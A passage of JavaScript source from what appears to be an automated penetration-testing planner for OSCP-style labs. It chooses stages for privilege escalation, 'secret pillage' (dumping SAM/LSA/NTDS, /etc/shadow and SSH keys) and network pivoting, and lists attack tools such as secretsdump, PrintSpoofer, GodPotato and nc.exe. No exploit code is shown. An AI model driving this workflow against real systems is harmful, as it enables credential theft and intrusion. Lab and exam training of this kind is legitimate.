            ? 'Stage 2 in Lab Mode will run all deep enumeration, crack hashes, validate credentials, and automatically execute foothold + flag capture.'
            : 'Stage 2 executes all unlocked safe frontier moves, spiders shares, cracks hashes offline, and stages privesc binaries into ./www/.',
          whyNext: whyNext,
          primaryCheckpoint: cps.foothold[0] || null,
        };
      }
    } else if (stPlan.activeStageId === 'foothold') {
      if (cps.escalate.length && (stPlan.flags.local || privs.length)) {
        whyNext = 'Stage 3 triage confirmed ' + (privs.length ? privs.join(', ') : 'local host enumeration')
          + (stPlan.flags.local ? ' and captured local.txt' : '')
          + '. That directly unlocks ' + cps.escalate[0].action.title + ' to escalate to root/SYSTEM.';
        rec = {
          kind: 'checkpoint',
          stageId: 'foothold',
          badge: 'PRIVESC VECTOR CONFIRMED -> ESCALATE NOW',
          title: 'Privilege Escalation Unlocked: ' + cps.escalate[0].action.title,
          detail: 'Run the pre-filled privilege escalation command below to reach root/SYSTEM, then paste the output back to advance to Stage 4.',
          whyNext: whyNext,
          primaryCheckpoint: cps.escalate[0],
        };
      } else {
        whyNext = 'Initial foothold is established on ' + (osLabel || 'the target')
          + '. Stage 3 connects from Kali (or runs inside your host shell) to capture local.txt, check kernel/sudo/SUID/service/token privileges, harvest stored credentials, and discover internal routes/ARP.';
        rec = {
          kind: 'stage',
          stageId: 'foothold',
          badge: 'NEXT: RUN STAGE 3 TRIAGE & LOCAL.TXT (.SH)',
          title: 'Run Stage 3 (Foothold Triage & local.txt) from Kali or Target Shell',
          detail: 'Run Stage 3 from Kali to remotely capture local.txt and enumerate privilege escalation vectors (or log onto the target shell using the command below).',
          whyNext: whyNext,
          primaryCheckpoint: cps.escalate[0] || null,
        };
      }
    } else if (stPlan.activeStageId === 'loot') {
      if (stPlan.flags.local && stPlan.flags.root && !stPlan.hasPivot) {
        whyNext = 'Host fully compromised! Both local.txt and proof.txt are already captured on ' + (osLabel || 'this target') + ' with elevated Administrator/root proof, and no secondary internal pivot subnets were detected.';
        rec = {
          kind: 'stage',
          stageId: 'loot',
          badge: 'HOST COMPROMISED - BOTH FLAGS CAPTURED',
          title: 'All Objectives Complete on ' + ((opts.fill && opts.fill.params && opts.fill.params.target) || 'Target'),
          detail: 'Both user.txt (local.txt) and root.txt (proof.txt) are already recorded on the ledger. For an OSCP exam screenshot (interactive shell showing whoami + ipconfig + flag), use the 1-Click Host Login command below - or run Stage 4 (.sh) from Kali to dump secrets and auto-open the host shell.',
          whyNext: whyNext,
          primaryCheckpoint: null,
        };
      } else {
        whyNext = 'Elevated root/SYSTEM access is proven. Stage 4 connects from Kali to capture proof.txt + OSCP proof block, dumps SAM/LSA/NTDS or /etc/shadow + SSH keys for lateral movement, checks internal routing tables, and launches an interactive host shell.';
        rec = {
          kind: 'stage',
          stageId: 'loot',
          badge: 'NEXT: RUN STAGE 4 PROOF & PILLAGE (.SH)',
          title: 'Run Stage 4 (Post-Root Proof, Secret Pillage & Interactive Shell)',
          detail: 'Run Stage 4 from Kali (or use the Interactive Host Login command below) to capture proof.txt, dump secrets, and drop into an interactive root/Administrator shell for your OSCP screenshot.',
          whyNext: whyNext,
          primaryCheckpoint: cps.lateral[0] || null,
        };
      }
    } else {
      whyNext = 'Both flags are captured and route enumeration revealed internal subnet(s) ' + (subs.join(', ') || 'on a secondary interface') + '. Stage 5 auto-negotiates the tunnel so you can add the internal subnet in the Scope Bar and start Stage 1.';
      rec = {
        kind: 'pivot',
        stageId: 'pivot',
        badge: 'STAGE 5 ACTIVE: ZERO-CONFIG PIVOT',
        title: 'Launch Stage 5 Auto-Pivot into ' + (subs[0] || 'Internal Subnet'),
        detail: 'Download the Auto-Pivot script below, run the target agent one-liner if prompted, and then click the subnet chip in the Scope Bar above to sweep the internal network.',
        whyNext: whyNext,
        primaryCheckpoint: null,
      };
    }

    return {
      stagePlan: stPlan,
      stats: stats,
      highlights: highlights,
      ruledOut: ruledOut,
      whyNext: whyNext,
      recommendation: rec,
    };
  }

  function _readArsenalProfile(explicitProf) {
    if (explicitProf && typeof explicitProf === 'object') return explicitProf;
    try {
      if (root.OBOL && root.OBOL.arsenal && typeof root.OBOL.arsenal.profileGet === 'function') {
        var p = root.OBOL.arsenal.profileGet();
        if (p) return p;
      }
      if (typeof localStorage !== 'undefined') {
        return JSON.parse(localStorage.getItem('obol.arsenal-profile') || 'null');
      }
    } catch (e) {}
    return null;
  }

  function _isToolPresentInProfile(keyOrDest, prof) {
    if (!prof || !keyOrDest) return false;
    var A = (root.OBOL && root.OBOL.ARSENAL) || {};
    var k = String(keyOrDest).toLowerCase();
    var stripped = k.replace(/-ad$/, '');
    var e = A[k] || A[stripped] || null;
    var canonicalKey = e ? e.key : k;
    var tools = prof.tools || {};
    if (tools[canonicalKey] && tools[canonicalKey].present) return true;
    if (tools[k] && tools[k].present) return true;
    if (tools[stripped] && tools[stripped].present) return true;
    var tKeys = Object.keys(tools);
    for (var i = 0; i < tKeys.length; i++) {
      var tk = tKeys[i];
      var tv = tools[tk];
      if (tv && tv.present && String(tv.invocation || '').toLowerCase() === k) return true;
    }
    var staged = prof.staged || [];
    if (staged.indexOf(keyOrDest) >= 0) return true;
    if (e && e.dest && staged.indexOf(e.dest) >= 0) return true;
    var digests = prof.digests || {};
    if (digests[canonicalKey] || digests[k] || digests[stripped]) return true;
    return false;
  }

  function checkArsenalReadiness(stageId, stPlan, explicitProf) {
    var prof = _readArsenalProfile(explicitProf);
    var A = (root.OBOL && root.OBOL.ARSENAL) || {};
    var totalCount = 0;
    var readyCount = 0;
    var seen = {};
    Object.keys(A).forEach(function (k) {
      var e = A[k];
      if (!e || seen[e.key]) return;
      seen[e.key] = 1;
      totalCount++;
      if (e.class === 'builtin' || (prof && _isToolPresentInProfile(e.key, prof))) {
        readyCount++;
      }
    });

    var stageReq = [];
    var osFam = (stPlan && stPlan.osFamily) || 'linux';
    if (stageId === 'recon') {
      stageReq = ['nmap', 'nxc', 'smbclient', 'ldapsearch', 'ffuf', 'whatweb', 'impacket-getnpusers', 'enum4linux-ng', 'showmount', 'snmpwalk', 'dig'];
    } else if (stageId === 'enum') {
      stageReq = ['nxc', 'john', 'ffuf', 'impacket-getuserspns', 'impacket-getnpusers', 'certipy', 'bloodyad'];
      var st2 = stPlan && stPlan.stages && stPlan.stages[1];
      if (st2 && Array.isArray(st2.queuedMoves)) {
        st2.queuedMoves.forEach(function (qm) {
          var t = qm && qm.action && qm.action.tool;
          if (t && stageReq.indexOf(t.toLowerCase()) < 0) stageReq.push(t.toLowerCase());
        });
      }
      var batchMoves = (stPlan && stPlan.examPlan && stPlan.examPlan.batch) || [];
      batchMoves.forEach(function (b) {
        var a = b && b.action;
        if (!a) return;
        if (a.tool && stageReq.indexOf(a.tool.toLowerCase()) < 0) stageReq.push(a.tool.toLowerCase());
        ((a && a.commands) || []).forEach(function (c) {
          if (c && c.tool && stageReq.indexOf(c.tool.toLowerCase()) < 0) stageReq.push(c.tool.toLowerCase());
        });
      });
    } else if (stageId === 'foothold') {
      stageReq = (osFam === 'windows')
        ? ['winPEASx64.exe', 'PrintSpoofer.exe', 'GodPotato.exe', 'nc.exe']
        : ['linpeas.sh', 'pspy64', 'linux-exploit-suggester.sh'];
    } else if (stageId === 'loot') {
      stageReq = ['impacket-secretsdump', 'nxc', 'john'];
    } else if (stageId === 'pivot') {
      stageReq = ['ligolo-proxy', 'chisel', 'sshuttle', 'agent'];
    }

    var stageReady = [];
    var stageMissing = [];
    if (prof) {
      stageReq.forEach(function (item) {
        var e = A[String(item).toLowerCase()];
        if (e && e.class === 'builtin') {
          stageReady.push(e.label || item);
          return;
        }
        var label = (e && (e.label || e.canonical)) || item;
        if (_isToolPresentInProfile(item, prof)) {
          if (stageReady.indexOf(label) < 0) stageReady.push(label);
        } else {
          if (stageMissing.indexOf(label) < 0) stageMissing.push(label);
        }
      });
    }

    return {
      synced: !!prof,
      savedAt: prof ? prof.savedAt : null,
      readyCount: readyCount,
      totalCount: totalCount,
      stagedCount: prof && Array.isArray(prof.staged) ? prof.staged.length : 0,
      wordlists: (prof && prof.wordlists) || {},
      stageId: stageId || 'recon',
      stageReady: stageReady,
      stageMissing: stageMissing,
      allStageReady: !!prof && stageMissing.length === 0,
    };
  }

  OBOL.cruise = {
    MODES: MODES,
    STAGES: STAGES,
    tierOf: tierOf,
    allowsTier: allowsTier,
    plan: plan,
    buildScript: buildScript,
    frontierPhase: frontierPhase,
    detectTargetOs: detectTargetOs,
    manualCheckpoints: manualCheckpoints,
    planStages: planStages,
    buildStageScript: buildStageScript,
    validTarget: validTarget,
    buildStageOneLiner: buildStageOneLiner,
    buildHostShellAccess: buildHostShellAccess,
    summarizeHandoff: summarizeHandoff,
    checkArsenalReadiness: checkArsenalReadiness,
  };
  if (typeof module !== 'undefined' && module.exports) { module.exports = OBOL.cruise; }
})(typeof globalThis !== 'undefined' ? globalThis : this);
